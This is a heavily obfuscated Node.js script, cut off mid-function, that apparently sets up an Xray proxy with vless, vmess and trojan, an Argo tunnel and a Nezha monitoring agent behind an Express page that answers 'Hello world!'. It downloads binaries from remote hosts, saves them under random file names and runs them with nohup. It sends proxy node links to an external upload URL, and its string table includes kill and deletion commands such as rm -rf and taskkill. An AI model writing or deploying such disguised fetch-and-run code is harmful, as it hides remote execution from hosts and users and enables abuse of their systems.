const _0x17836e = _0x1928;
(function (_0x18b522, _0x67b7b7) {
    const _0x11f2fa = _0x1928, _0x57208f = _0x18b522();
    while (!![]) {
        try {
            const _0x3347dd = -parseInt(_0x11f2fa(0x1eb)) / (0x17d1 + -0x3c * -0x44 + 0xd4 * -0x30) * (-parseInt(_0x11f2fa(0x212)) / (-0x1f51 + 0x14a5 + 0xaae)) + parseInt(_0x11f2fa(0x29f)) / (-0x3 * 0x407 + 0x1077 + -0x45f) + parseInt(_0x11f2fa(0x15d)) / (0x1492 + 0x9 * -0x158 + -0x876) + -parseInt(_0x11f2fa(0x9b)) / (0x1077 + 0x1556 + -0x25c8) + parseInt(_0x11f2fa(0x232)) / (0x1a * 0x16d + -0x2 * -0x1191 + 0x2 * -0x2417) + parseInt(_0x11f2fa(0x1ff)) / (0x17 * -0x91 + 0x6c * 0x15 + 0x432) + -parseInt(_0x11f2fa(0x201)) / (0x1b3b + -0x26e6 * -0x1 + -0x4219 * 0x1) * (parseInt(_0x11f2fa(0x1f2)) / (0x3d9 * 0x5 + -0x2 * 0xfec + 0xca4));
            if (_0x3347dd === _0x67b7b7)
                break;
            else
                _0x57208f['push'](_0x57208f['shift']());
        } catch (_0x4aa010) {
            _0x57208f['push'](_0x57208f['shift']());
        }
    }
}(_0x1418, -0x16db * 0x1 + -0x27d37 + 0x4295f));
const express = require(_0x17836e(0x25a)), app = express(), axios = require(_0x17836e(0xc4)), os = require('os'), fs = require('fs'), path = require(_0x17836e(0x261)), {promisify} = require(_0x17836e(0xcc)), exec = promisify(require(_0x17836e(0x269) + _0x17836e(0x1a7))[_0x17836e(0x15b)]), {execSync} = require(_0x17836e(0x269) + _0x17836e(0x1a7)), UPLOAD_URL = process[_0x17836e(0xe5)][_0x17836e(0xab)] || '', PROJECT_URL = process[_0x17836e(0xe5)][_0x17836e(0x175) + 'L'] || '', AUTO_ACCESS = process[_0x17836e(0xe5)][_0x17836e(0xe2) + 'S'] || ![], FILE_PATH = process[_0x17836e(0xe5)][_0x17836e(0x157)] || _0x17836e(0xd1), SUB_PATH = process[_0x17836e(0xe5)][_0x17836e(0x96)] || _0x17836e(0xb8), PORT = process[_0x17836e(0xe5)][_0x17836e(0x1e7) + 'T'] || process[_0x17836e(0xe5)][_0x17836e(0x235)] || -0x1309 + 0x2513 * 0x1 + 0x1 * -0x652, UUID = process[_0x17836e(0xe5)][_0x17836e(0x8f)] || _0x17836e(0x135) + _0x17836e(0x141) + _0x17836e(0x245) + _0x17836e(0x27b), NEZHA_SERVER = process[_0x17836e(0xe5)][_0x17836e(0x226) + 'ER'] || '', NEZHA_PORT = process[_0x17836e(0xe5)][_0x17836e(0xf2)] || '', NEZHA_KEY = process[_0x17836e(0xe5)][_0x17836e(0x234)] || '', ARGO_DOMAIN = process[_0x17836e(0xe5)][_0x17836e(0x11a) + 'N'] || '', ARGO_AUTH = process[_0x17836e(0xe5)][_0x17836e(0x191)] || '', ARGO_PORT = process[_0x17836e(0xe5)][_0x17836e(0xf8)] || -0x9 * -0x4af + 0x1cc + -0xcb2, CFIP = process[_0x17836e(0xe5)][_0x17836e(0x24d)] || _0x17836e(0xc3) + _0x17836e(0x19f), CFPORT = process[_0x17836e(0xe5)][_0x17836e(0x279)] || 0x1ab3 + 0xb09 * -0x2 + -0x35 * 0xe, NAME = process[_0x17836e(0xe5)][_0x17836e(0x1fb)] || _0x17836e(0x27a);
!fs[_0x17836e(0x27d)](FILE_PATH) ? (fs[_0x17836e(0x264)](FILE_PATH), console[_0x17836e(0x198)](FILE_PATH + (_0x17836e(0x287) + 'd'))) : console[_0x17836e(0x198)](FILE_PATH + (_0x17836e(0x1ac) + _0x17836e(0x225)));
function generateRandomName() {
    const _0x1ff5e5 = _0x17836e, _0x1fc94c = {
            'JmeDW': _0x1ff5e5(0x146) + _0x1ff5e5(0x1bf) + _0x1ff5e5(0x20c),
            'AHBzA': function (_0x423cc7, _0x1145ba) {
                return _0x423cc7 < _0x1145ba;
            },
            'ePYbD': function (_0x2fc1ac, _0x206133) {
                return _0x2fc1ac * _0x206133;
            }
        }, _0x43f99e = _0x1fc94c[_0x1ff5e5(0x224)];
    let _0x4a3a5a = '';
    for (let _0x193b5d = 0xdea + 0x1 * 0x200 + -0xfea; _0x1fc94c[_0x1ff5e5(0x9a)](_0x193b5d, 0x2577 + -0xe * 0xf9 + -0x17d3); _0x193b5d++) {
        _0x4a3a5a += _0x43f99e[_0x1ff5e5(0x1f8)](Math[_0x1ff5e5(0x94)](_0x1fc94c[_0x1ff5e5(0x24b)](Math[_0x1ff5e5(0x1bd)](), _0x43f99e[_0x1ff5e5(0x286)])));
    }
    return _0x4a3a5a;
}
const npmName = generateRandomName(), webName = generateRandomName(), botName = generateRandomName(), phpName = generateRandomName();
function _0x1928(_0x5da283, _0x1f3289) {
    const _0x159d8f = _0x1418();
    return _0x1928 = function (_0x34f48c, _0x4c3c9d) {
        _0x34f48c = _0x34f48c - (0x105d + -0x9d0 + -0x605);
        let _0x2a832d = _0x159d8f[_0x34f48c];
        return _0x2a832d;
    }, _0x1928(_0x5da283, _0x1f3289);
}
let npmPath = path[_0x17836e(0x28b)](FILE_PATH, npmName), phpPath = path[_0x17836e(0x28b)](FILE_PATH, phpName), webPath = path[_0x17836e(0x28b)](FILE_PATH, webName), botPath = path[_0x17836e(0x28b)](FILE_PATH, botName), subPath = path[_0x17836e(0x28b)](FILE_PATH, _0x17836e(0x18c)), listPath = path[_0x17836e(0x28b)](FILE_PATH, _0x17836e(0x1e9)), bootLogPath = path[_0x17836e(0x28b)](FILE_PATH, _0x17836e(0x228)), configPath = path[_0x17836e(0x28b)](FILE_PATH, _0x17836e(0x1d4) + 'n');
function deleteNodes() {
    const _0x3db613 = _0x17836e, _0x452b69 = {
            'fleaC': _0x3db613(0x22c),
            'VIpXM': _0x3db613(0xe4),
            'mnvbI': function (_0x4a409a, _0x3d5500) {
                return _0x4a409a === _0x3d5500;
            },
            'gPxmv': _0x3db613(0x22a) + _0x3db613(0xbc)
        };
    try {
        if (!UPLOAD_URL)
            return;
        if (!fs[_0x3db613(0x27d)](subPath))
            return;
        let _0x47ab77;
        try {
            _0x47ab77 = fs[_0x3db613(0x285) + 'nc'](subPath, _0x452b69[_0x3db613(0x251)]);
        } catch {
            return null;
        }
        const _0x44e783 = Buffer[_0x3db613(0xa0)](_0x47ab77, _0x452b69[_0x3db613(0xca)])[_0x3db613(0x28c)](_0x452b69[_0x3db613(0x251)]), _0x540a0d = _0x44e783[_0x3db613(0x99)]('\x0a')[_0x3db613(0x10c)](_0x55ef45 => /(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3db613(0xc2)](_0x55ef45));
        if (_0x452b69[_0x3db613(0xd8)](_0x540a0d[_0x3db613(0x286)], -0xa43 * -0x3 + -0x17d2 + 0x6f7 * -0x1))
            return;
        return axios[_0x3db613(0x143)](UPLOAD_URL + (_0x3db613(0x1c9) + _0x3db613(0x129)), JSON[_0x3db613(0xef)]({ 'nodes': _0x540a0d }), { 'headers': { 'Content-Type': _0x452b69[_0x3db613(0x1da)] } })[_0x3db613(0x21d)](_0x424d66 => {
            return null;
        }), null;
    } catch (_0x563310) {
        return null;
    }
}
function cleanupOldFiles() {
    const _0x2887c7 = _0x17836e;
    try {
        const _0x41e108 = fs[_0x2887c7(0x214) + 'c'](FILE_PATH);
        _0x41e108[_0x2887c7(0xb5)](_0x31425d => {
            const _0x5bc780 = _0x2887c7, _0x255556 = path[_0x5bc780(0x28b)](FILE_PATH, _0x31425d);
            try {
                const _0xcf57b0 = fs[_0x5bc780(0x16c)](_0x255556);
                _0xcf57b0[_0x5bc780(0x1a5)]() && fs[_0x5bc780(0x167)](_0x255556);
            } catch (_0x787469) {
            }
        });
    } catch (_0x28dcc2) {
    }
}
app[_0x17836e(0x183)]('/', function (_0x3ce748, _0x200363) {
    const _0x376033 = _0x17836e, _0x17214e = { 'ecWCY': _0x376033(0x1aa) + 'd!' };
    _0x200363[_0x376033(0x189)](_0x17214e[_0x376033(0x2a1)]);
});
function _0x1418() {
    const _0x41a0a9 = [
        'none',
        'FGuNg',
        'orce_updat',
        'DtDvt',
        'writeFileS',
        'sNjPt',
        'set',
        'aMYPk',
        'ull\x202>&1',
        'lse\x0ainsecu',
        'AjXeY',
        'xtls-rprx-',
        '\x20is\x20runnin',
        'filter',
        '/trojan-ar',
        '8/dns-quer',
        'n\x20connect\x20',
        'YEdGs',
        '\x20>/dev/nul',
        'includes',
        'loading\x20fi',
        'kTVyo',
        'iaVxg',
        'https://ar',
        '\x20>\x20nul\x202>&',
        'RCYJP',
        'pty,skip\x20r',
        'ARGO_DOMAI',
        'for\x20using\x20',
        'rojan-argo',
        'zyPeP',
        'tls',
        'dQezc',
        'oDomain',
        'https://oo',
        'PIPlU',
        'zJoSR',
        'e_auto_upd',
        'ZCLYb',
        'qUbDs',
        'zSeLB',
        'IZuFw',
        'e-nodes',
        'yc.mn/bot',
        'ue\x0aip_repo',
        'http',
        'listen',
        'aarch64',
        'p2\x20run\x20--t',
        'tdsYR',
        '--tls',
        'MyNlF',
        '--no-autou',
        'ty,\x20use\x20qu',
        '335939f9-5',
        'close',
        'atus:404\x0a\x20',
        '/api/add-s',
        '&path=%2Fv',
        'iJbmc',
        'pMckg',
        'UIKQr',
        '\x20-c\x20\x22',
        ':\x0a\x20\x20\x20\x20\x20\x20\x20\x20',
        'ostname:\x20',
        'unlink',
        '89f-416a-b',
        'XDzpI',
        'post',
        'ml\x22\x20>/dev/',
        't-delay\x204\x20',
        'abcdefghij',
        'dGzin',
        'GPiSl',
        'Error\x20down',
        'substring',
        'd64.ssss.n',
        'tcp',
        'akIDM',
        'vless',
        'k\x20added\x20su',
        'Can\x27t\x20find',
        'success',
        ';\x20charset=',
        'VowAZ',
        'urAGi',
        'arm64',
        'CwmYT',
        'FILE_PATH',
        'AUTH\x20varia',
        'platform',
        'ebwMI',
        'exec',
        'mLTNA',
        '26284GrnbQf',
        '2|0|5|3|6|',
        'yc.mn/v1',
        'r\x20is\x20runni',
        'ginRequest',
        'amd',
        'pdate\x20--pr',
        'firefox',
        '2087',
        '/dev/null',
        'unlinkSync',
        'YpLFP',
        '2096',
        'del\x20/f\x20/q\x20',
        'ing\x20boot.l',
        'statSync',
        '\x20--disable',
        'ull\x202>&1\x20&',
        'null\x202>&1\x20',
        'HEMyn',
        'api.com/js',
        'UsMWm',
        'nohup\x20',
        '-auto-upda',
        'PROJECT_UR',
        'ection_cou',
        '\x22\x20>\x20/dev/n',
        'ODdeF',
        'rm\x20-rf\x20',
        'on\x20>/dev/n',
        'win32',
        'CvyVk',
        'zLPpg',
        'pop',
        '2053',
        'te\x20--repor',
        'ocalhost:',
        'xEqzx',
        'get',
        'NMGin',
        'ure:\x20false',
        'vice:\x20http',
        'ials-file:',
        'DZiDP',
        'send',
        'Subscripti',
        'block',
        'sub.txt',
        'qleiV',
        '_to_upgrad',
        '&fp=firefo',
        'Empowermen',
        'ARGO_AUTH',
        'st:',
        'YSgwL',
        'App\x20is\x20run',
        'ecture',
        'r\x20the\x20curr',
        '\x20\x20-\x20servic',
        'log',
        'ArgoDomain',
        'hvXXN',
        'pMbXH',
        '1|4',
        ':\x20false\x0auu',
        'stream',
        'eu.org',
        '?security=',
        'rrWZR',
        'y:\x20true\x0a\x20\x20',
        'd:\x20',
        '/boot.log\x20',
        'isFile',
        'lIzFO',
        'ess',
        'message',
        'DAxLA',
        'Hello\x20worl',
        'sable_nat:',
        '\x20already\x20e',
        '2083',
        'nt:\x20true\x0as',
        'xeByf',
        'Unhandled\x20',
        't,\x20enjoy!',
        'Chfhw',
        'ARGO_AUTH\x20',
        'on\x20uploade',
        'sni=',
        'syeWM',
        'TpoPW',
        'aved\x20succe',
        '&path=%2Ft',
        'yc.mn/agen',
        'ssfully',
        'https://ip',
        'random',
        'Download\x20',
        'klmnopqrst',
        'freedom',
        'e:\x20http_st',
        'aded\x20succe',
        'm64.ssss.n',
        'JFKdh',
        'hHPEF',
        'vavhe',
        'QKfmH',
        'kip_procs_',
        '/api/delet',
        'rniOK',
        'e:\x20true\x0adi',
        '/tunnel.ym',
        'cret:\x20',
        'rocs\x20>/dev',
        'access\x20tas',
        'id:\x20',
        'pkill\x20-f\x20\x22',
        'BUhII',
        'l://8.8.8.',
        'config.jso',
        'EUUzn',
        'fdsFs',
        '\x0askip_conn',
        '\x0atls:\x20',
        '\x0a\x20\x20credent',
        'gPxmv',
        'l:\x20http2\x0a\x20',
        'for\x20',
        'otocol\x20htt',
        '/config.ya',
        'AoIeG',
        'Nodes\x20uplo',
        'https://am',
        'vmess',
        'TunnelSecr',
        'Bjqif',
        'le\x20',
        'NEZHA\x20vari',
        'SERVER_POR',
        'Content-Ty',
        'list.txt',
        '60#',
        '1YfYUPb',
        'd\x20successf',
        '\x20info\x20--ur',
        '\x20-c\x20',
        'og:',
        'config.yam',
        '\x20task\x20fail',
        '27SKTDWq',
        'on/',
        'l\x202>&1\x20&',
        'Add\x20automa',
        'MhkpY',
        'l\x202>&1',
        'charAt',
        'countryCod',
        'mCAAj',
        'NAME',
        'ahexi',
        'error',
        '\x0avless://',
        '31934FcTgRM',
        '--config\x20',
        '385816dyfQvn',
        'x&type=ws&',
        'hgIMk',
        'PRFQa',
        'Thank\x20you\x20',
        'unnelSecre',
        're_tls:\x20tr',
        'or\x20',
        'createWrit',
        'country_co',
        'nzIip',
        'uvwxyz',
        'ss\x20task',
        '\x20successfu',
        'Error\x20exec',
        'unning',
        'se\x0agpu:\x20fa',
        '347394kntpLJ',
        '\x0adebug:\x20fa',
        'readdirSyn',
        'ErbGW',
        '3Fed%3D256',
        'npm\x20runnin',
        'SMyJj',
        'https+loca',
        'tiehe',
        'QGtmZ',
        'PZhtu',
        'catch',
        '\x0ause_gitee',
        'fileUrl',
        'BtwBN',
        'unshift',
        'AvWkF',
        'INivd',
        'JmeDW',
        'xists',
        'NEZHA_SERV',
        'yNfkq',
        'boot.log',
        'tGdVj',
        'applicatio',
        'rPSYg',
        'utf-8',
        't\x20failed\x20f',
        '\x20-p\x20',
        'o?ed=2560',
        'rRhtK',
        'pipe',
        '826380zWamSE',
        'yXsFo',
        'NEZHA_KEY',
        'PORT',
        '/vmess-arg',
        '\x20false\x0adis',
        'qrDdg',
        'less-argo%',
        'api.co/jso',
        'ully',
        'p2\x20--logfi',
        'match',
        'SlyJA',
        'maipK',
        'Wxkpr',
        '443',
        'WYJkH',
        'zmdOL',
        'ick\x20tunnel',
        '71e-aaad1a',
        'ng\x20on\x20port',
        'l\x20run',
        'xAGYl',
        'ZeNgT',
        'ZZoBz',
        'ePYbD',
        'les:',
        'CFIP',
        'ble\x20is\x20emp',
        '\x0adisable_f',
        't,use\x20toke',
        'fleaC',
        'ivDVq',
        'arm',
        'NXhVR',
        'dge-ip-ver',
        'odes',
        'response',
        'FvIjf',
        '8443',
        'express',
        'zJYBm',
        '\x0a\x20\x20\x20\x20\x20\x20ori',
        'org',
        'n=none&sec',
        '?encryptio',
        'untry_code',
        'path',
        'uting\x20comm',
        'hgpxm',
        'mkdirSync',
        'taskkill\x20/',
        't\x20success\x20',
        '.exe\x20>\x20nul',
        'bBxJT',
        'child_proc',
        'net/add-ur',
        'rt_period:',
        'ate:\x20true\x0a',
        '/sub.txt\x20s',
        'this\x20scrip',
        'rgQQJ',
        'ng\x20bot\x20to\x20',
        'ning',
        '\x0a\x20\x20protoco',
        'status',
        'fileName',
        'ubscriptio',
        'CFiKS',
        'Skipping\x20a',
        'oo.serv00.',
        'CFPORT',
        'usyun',
        '31f877',
        'finish',
        'existsSync',
        'rCATw',
        'ccessfully',
        'e:\x20false\x0au',
        'e\x0atemperat',
        'map',
        'xFJKS',
        'ync',
        'readFileSy',
        'length',
        '\x20is\x20create',
        ',\x20re-runni',
        'ktSMP',
        'automatic\x20',
        'join',
        'toString',
        'tbEqd',
        'error\x20in\x20s',
        'f\x20/im\x20',
        '\x20not\x20found',
        'DGieZ',
        'NEvHz',
        'noTLSVerif',
        'HUEgW',
        'dlTvQ',
        'QkcjD',
        'GCAmt',
        'all',
        'obtain\x20Arg',
        'oken\x20',
        'n\x20--skip-p',
        'GSilM',
        'push',
        'cbMTm',
        '9237QARDyZ',
        'EAUAv',
        'ecWCY',
        'eyirU',
        'mismatch\x20T',
        'sMIcp',
        '\x20\x0a\x20\x20ingres',
        'gHCSQ',
        '/config.js',
        'GsgpY',
        'jmqXd',
        'eStream',
        'N\x20or\x20ARGO_',
        '://localho',
        'and:\x20',
        'tartserver',
        '\x20failed:\x20',
        'ute:\x20false',
        'DvcCQ',
        '--skip-con',
        'urity=tls&',
        'uYIfB',
        'wylAc',
        'php\x20runnin',
        'aFeYq',
        'Error\x20read',
        '\x0a\x0avmess://',
        '4\x0aserver:\x20',
        'UUID',
        '/api/add-n',
        'iBlCR',
        'arch',
        'Unknown',
        'floor',
        'tunnel.jso',
        'SUB_PATH',
        'to\x20tunnel',
        'lse\x0adisabl',
        'split',
        'AHBzA',
        '386005zLiviU',
        'tunnel\x20--e',
        '\x0a\x20\x20tunnel:',
        'IAviC',
        '\x0a\x0atrojan:/',
        'from',
        's:\x0a\x20\x20\x20\x20-\x20h',
        'basename',
        'XjPZE',
        'sion\x20auto\x20',
        'clear',
        'tic\x20access',
        'YCbtY',
        '\x20a\x20file\x20fo',
        '127.0.0.1',
        'fTved',
        'UPLOAD_URL',
        'chmod',
        'blackhole',
        'yWYpP',
        'LBiaQ',
        '/null\x202>&1',
        'then',
        'query:\x20fal',
        'rt_delay:\x20',
        'able\x20is\x20em',
        'forEach',
        'text/plain',
        'tls&sni=',
        'panel',
        '%3Fed%3D25',
        '\x20-s\x20',
        '\x0a\x20\x20\x20\x20',
        'n/json',
        'has',
        '--loglevel',
        'HKsMv',
        'rOuSl',
        'mjkrB',
        'test',
        'cdns.doon.',
        'axios',
        'http://ip-',
        'irIXc',
        'aLcaB',
        'l\x20http://l',
        'ZtQjj',
        'VIpXM',
        'yc.mn/web',
        'util',
        'disable_co',
        'FhwPJ',
        'true',
        'lly',
        './tmp',
        '\x201800\x0arepo',
        'hyJuA',
        'web\x20runnin',
        'CTBwF',
        'host=',
        'trojan',
        'mnvbI',
        'kVKgt',
        'quic',
        'Error\x20in\x20s',
        'jfRlD',
        '\x202>&1',
        'g\x20error:\x20',
        'hdfKp',
        'hXENt',
        'se_ipv6_co',
        'AUTO_ACCES',
        '\x0a\x20\x20\x20\x20\x20\x20ser',
        'base64',
        'env',
        'vision',
        'count:\x20tru',
        'bFUIT',
        'matic\x20acce',
        'nPvMp',
        'false',
        'rUuHY',
        'ent\x20archit',
        'able_send_',
        'stringify',
        'dding\x20auto',
        'WfQeU',
        'NEZHA_PORT',
        'data',
        'yDghH',
        '\x0aclient_se',
        'direct',
        'XANfP',
        'ARGO_PORT',
        'oTKWb',
        '/vless-arg',
        'mmand_exec',
        'daCjn',
        'http\x20serve',
        'tunnel.yml'
    ];
    _0x1418 = function () {
        return _0x41a0a9;
    };
    return _0x1418();
}
async function generateConfig() {
    const _0x3661c0 = _0x17836e, _0x45d80e = {
            'vavhe': _0x3661c0(0x166),
            'ZZoBz': _0x3661c0(0xff),
            'nzIip': _0x3661c0(0x14e),
            'gHCSQ': _0x3661c0(0x10a) + _0x3661c0(0xe6),
            'qUbDs': _0x3661c0(0xfa) + 'o',
            'AoIeG': _0x3661c0(0x236) + 'o',
            'ZtQjj': _0x3661c0(0x10d) + 'go',
            'xeByf': _0x3661c0(0x14c),
            'qrDdg': _0x3661c0(0xa9),
            'lIzFO': _0x3661c0(0x12c),
            'xEqzx': _0x3661c0(0x11e),
            'VowAZ': _0x3661c0(0xda),
            'daCjn': _0x3661c0(0x1e2),
            'xFJKS': _0x3661c0(0xd7),
            'fTved': _0x3661c0(0x219) + _0x3661c0(0x1d3) + _0x3661c0(0x10e) + 'y',
            'CFiKS': _0x3661c0(0x1c0),
            'Wxkpr': _0x3661c0(0xf6),
            'hyJuA': _0x3661c0(0xad),
            'xAGYl': _0x3661c0(0x18b),
            'bFUIT': _0x3661c0(0x1d4) + 'n'
        }, _0x361c12 = {
            'log': {
                'access': _0x45d80e[_0x3661c0(0x1c6)],
                'error': _0x45d80e[_0x3661c0(0x1c6)],
                'loglevel': _0x45d80e[_0x3661c0(0x24a)]
            },
            'inbounds': [
                {
                    'port': ARGO_PORT,
                    'protocol': _0x45d80e[_0x3661c0(0x20b)],
                    'settings': {
                        'clients': [{
                                'id': UUID,
                                'flow': _0x45d80e[_0x3661c0(0x2a6)]
                            }],
                        'decryption': _0x45d80e[_0x3661c0(0x24a)],
                        'fallbacks': [
                            { 'dest': 0xbb9 },
                            {
                                'path': _0x45d80e[_0x3661c0(0x126)],
                                'dest': 0xbba
                            },
                            {
                                'path': _0x45d80e[_0x3661c0(0x1df)],
                                'dest': 0xbbb
                            },
                            {
                                'path': _0x45d80e[_0x3661c0(0xc9)],
                                'dest': 0xbbc
                            }
                        ]
                    },
                    'streamSettings': { 'network': _0x45d80e[_0x3661c0(0x1af)] }
                },
                {
                    'port': 0xbb9,
                    'listen': _0x45d80e[_0x3661c0(0x238)],
                    'protocol': _0x45d80e[_0x3661c0(0x20b)],
                    'settings': {
                        'clients': [{ 'id': UUID }],
                        'decryption': _0x45d80e[_0x3661c0(0x24a)]
                    },
                    'streamSettings': {
                        'network': _0x45d80e[_0x3661c0(0x1af)],
                        'security': _0x45d80e[_0x3661c0(0x24a)]
                    }
                },
                {
                    'port': 0xbba,
                    'listen': _0x45d80e[_0x3661c0(0x238)],
                    'protocol': _0x45d80e[_0x3661c0(0x20b)],
                    'settings': {
                        'clients': [{
                                'id': UUID,
                                'level': 0x0
                            }],
                        'decryption': _0x45d80e[_0x3661c0(0x24a)]
                    },
                    'streamSettings': {
                        'network': 'ws',
                        'security': _0x45d80e[_0x3661c0(0x24a)],
                        'wsSettings': { 'path': _0x45d80e[_0x3661c0(0x126)] }
                    },
                    'sniffing': {
                        'enabled': !![],
                        'destOverride': [
                            _0x45d80e[_0x3661c0(0x1a6)],
                            _0x45d80e[_0x3661c0(0x182)],
                            _0x45d80e[_0x3661c0(0x153)]
                        ],
                        'metadataOnly': ![]
                    }
                },
                {
                    'port': 0xbbb,
                    'listen': _0x45d80e[_0x3661c0(0x238)],
                    'protocol': _0x45d80e[_0x3661c0(0xfc)],
                    'settings': {
                        'clients': [{
                                'id': UUID,
                                'alterId': 0x0
                            }]
                    },
                    'streamSettings': {
                        'network': 'ws',
                        'wsSettings': { 'path': _0x45d80e[_0x3661c0(0x1df)] }
                    },
                    'sniffing': {
                        'enabled': !![],
                        'destOverride': [
                            _0x45d80e[_0x3661c0(0x1a6)],
                            _0x45d80e[_0x3661c0(0x182)],
                            _0x45d80e[_0x3661c0(0x153)]
                        ],
                        'metadataOnly': ![]
                    }
                },
                {
                    'port': 0xbbc,
                    'listen': _0x45d80e[_0x3661c0(0x238)],
                    'protocol': _0x45d80e[_0x3661c0(0x283)],
                    'settings': { 'clients': [{ 'password': UUID }] },
                    'streamSettings': {
                        'network': 'ws',
                        'security': _0x45d80e[_0x3661c0(0x24a)],
                        'wsSettings': { 'path': _0x45d80e[_0x3661c0(0xc9)] }
                    },
                    'sniffing': {
                        'enabled': !![],
                        'destOverride': [
                            _0x45d80e[_0x3661c0(0x1a6)],
                            _0x45d80e[_0x3661c0(0x182)],
                            _0x45d80e[_0x3661c0(0x153)]
                        ],
                        'metadataOnly': ![]
                    }
                }
            ],
            'dns': { 'servers': [_0x45d80e[_0x3661c0(0xaa)]] },
            'outbounds': [
                {
                    'protocol': _0x45d80e[_0x3661c0(0x276)],
                    'tag': _0x45d80e[_0x3661c0(0x240)]
                },
                {
                    'protocol': _0x45d80e[_0x3661c0(0xd3)],
                    'tag': _0x45d80e[_0x3661c0(0x248)]
                }
            ]
        };
    fs[_0x3661c0(0x103) + _0x3661c0(0x284)](path[_0x3661c0(0x28b)](FILE_PATH, _0x45d80e[_0x3661c0(0xe8)]), JSON[_0x3661c0(0xef)](_0x361c12, null, -0x2083 + -0x2 * 0x1316 + 0x46b1));
}
function getSystemArchitecture() {
    const _0xdde8a6 = _0x17836e, _0x3425d7 = {
            'qleiV': function (_0x386955, _0x2aa78f) {
                return _0x386955 === _0x2aa78f;
            },
            'eyirU': _0xdde8a6(0x253),
            'zJoSR': function (_0x43f0e7, _0xc557f3) {
                return _0x43f0e7 === _0xc557f3;
            },
            'GsgpY': _0xdde8a6(0x155),
            'jmqXd': _0xdde8a6(0x12e),
            'INivd': _0xdde8a6(0x162)
        }, _0x4df423 = os[_0xdde8a6(0x92)]();
    return _0x3425d7[_0xdde8a6(0x18d)](_0x4df423, _0x3425d7[_0xdde8a6(0x2a2)]) || _0x3425d7[_0xdde8a6(0x123)](_0x4df423, _0x3425d7[_0xdde8a6(0x2a8)]) || _0x3425d7[_0xdde8a6(0x123)](_0x4df423, _0x3425d7[_0xdde8a6(0x2a9)]) ? _0x3425d7[_0xdde8a6(0x2a2)] : _0x3425d7[_0xdde8a6(0x223)];
}
function downloadFile(_0x403472, _0x52160c, _0x3e6b0b) {
    const _0x1c676c = _0x17836e, _0x543a31 = {
            'FGuNg': function (_0xa2658, _0x595848, _0xf18197) {
                return _0xa2658(_0x595848, _0xf18197);
            },
            'ODdeF': function (_0x39e09b, _0x4685c6) {
                return _0x39e09b(_0x4685c6);
            },
            'YEdGs': _0x1c676c(0x27c),
            'rgQQJ': _0x1c676c(0x1fd),
            'Bjqif': function (_0x565fb4, _0x221f29) {
                return _0x565fb4(_0x221f29);
            },
            'hvXXN': _0x1c676c(0x183),
            'syeWM': _0x1c676c(0x19e)
        }, _0x3ef2dc = _0x403472;
    !fs[_0x1c676c(0x27d)](FILE_PATH) && fs[_0x1c676c(0x264)](FILE_PATH, { 'recursive': !![] });
    const _0x2342f7 = fs[_0x1c676c(0x209) + _0x1c676c(0x2aa)](_0x3ef2dc);
    _0x543a31[_0x1c676c(0x1e4)](axios, {
        'method': _0x543a31[_0x1c676c(0x19a)],
        'url': _0x52160c,
        'responseType': _0x543a31[_0x1c676c(0x1b6)]
    })[_0x1c676c(0xb1)](_0x474d79 => {
        const _0x2a89bd = _0x1c676c, _0x3530d = {
                'zyPeP': function (_0x503b73, _0x401257, _0x2f1354) {
                    const _0x41c585 = _0x1928;
                    return _0x543a31[_0x41c585(0x100)](_0x503b73, _0x401257, _0x2f1354);
                },
                'mCAAj': function (_0x37267f, _0x4e6605) {
                    const _0x4e492f = _0x1928;
                    return _0x543a31[_0x4e492f(0x178)](_0x37267f, _0x4e6605);
                }
            };
        _0x474d79[_0x2a89bd(0xf3)][_0x2a89bd(0x231)](_0x2342f7), _0x2342f7['on'](_0x543a31[_0x2a89bd(0x110)], () => {
            const _0x403d77 = _0x2a89bd;
            _0x2342f7[_0x403d77(0x136)](), console[_0x403d77(0x198)](_0x403d77(0x1be) + path[_0x403d77(0xa2)](_0x3ef2dc) + (_0x403d77(0x20e) + _0x403d77(0xd0))), _0x3530d[_0x403d77(0x11d)](_0x3e6b0b, null, _0x3ef2dc);
        }), _0x2342f7['on'](_0x543a31[_0x2a89bd(0x26f)], _0x20cbf5 => {
            const _0x17d255 = _0x2a89bd;
            fs[_0x17d255(0x140)](_0x3ef2dc, () => {
            });
            const _0x331fbc = _0x17d255(0x1be) + path[_0x17d255(0xa2)](_0x3ef2dc) + _0x17d255(0x2af) + _0x20cbf5[_0x17d255(0x1a8)];
            console[_0x17d255(0x1fd)](_0x331fbc), _0x3530d[_0x17d255(0x1fa)](_0x3e6b0b, _0x331fbc);
        });
    })[_0x1c676c(0x21d)](_0x15d4f7 => {
        const _0xa8ac8f = _0x1c676c, _0xc59a67 = _0xa8ac8f(0x1be) + path[_0xa8ac8f(0xa2)](_0x3ef2dc) + _0xa8ac8f(0x2af) + _0x15d4f7[_0xa8ac8f(0x1a8)];
        console[_0xa8ac8f(0x1fd)](_0xc59a67), _0x543a31[_0xa8ac8f(0x178)](_0x3e6b0b, _0xc59a67);
    });
}
async function downloadFilesAndRun() {
    const _0x3dd58f = _0x17836e, _0x2dc629 = {
            'QGtmZ': function (_0x201961, _0x4bb9f1) {
                return _0x201961(_0x4bb9f1);
            },
            'hdfKp': function (_0x4dc98d, _0x115354, _0x579611, _0x889eed) {
                return _0x4dc98d(_0x115354, _0x579611, _0x889eed);
            },
            'ebwMI': function (_0x3aa9a5) {
                return _0x3aa9a5();
            },
            'rUuHY': function (_0x4b0626, _0x25ec2b) {
                return _0x4b0626 === _0x25ec2b;
            },
            'QKfmH': _0x3dd58f(0x149) + _0x3dd58f(0x113) + _0x3dd58f(0x24c),
            'zmdOL': function (_0xb0f0fb, _0x466c49) {
                return _0xb0f0fb(_0x466c49);
            },
            'DtDvt': function (_0x554497, _0x257fbf) {
                return _0x554497 && _0x257fbf;
            },
            'MhkpY': _0x3dd58f(0x241),
            'sNjPt': _0x3dd58f(0x259),
            'XANfP': _0x3dd58f(0x169),
            'iaVxg': _0x3dd58f(0x165),
            'EUUzn': _0x3dd58f(0x1ad),
            'iBlCR': _0x3dd58f(0x17f),
            'TpoPW': _0x3dd58f(0xcf),
            'AvWkF': _0x3dd58f(0xeb),
            'yNfkq': _0x3dd58f(0x1f0) + 'l',
            'YCbtY': function (_0x14a5a2, _0x3ba48f) {
                return _0x14a5a2(_0x3ba48f);
            },
            'ktSMP': _0x3dd58f(0x131),
            'mjkrB': function (_0xb4a45, _0x553140) {
                return _0xb4a45(_0x553140);
            },
            'UsMWm': _0x3dd58f(0x1e6) + _0x3dd58f(0xb4) + _0x3dd58f(0x119) + _0x3dd58f(0x210),
            'rCATw': function (_0xfd32c6, _0x24bcc0) {
                return _0xfd32c6(_0x24bcc0);
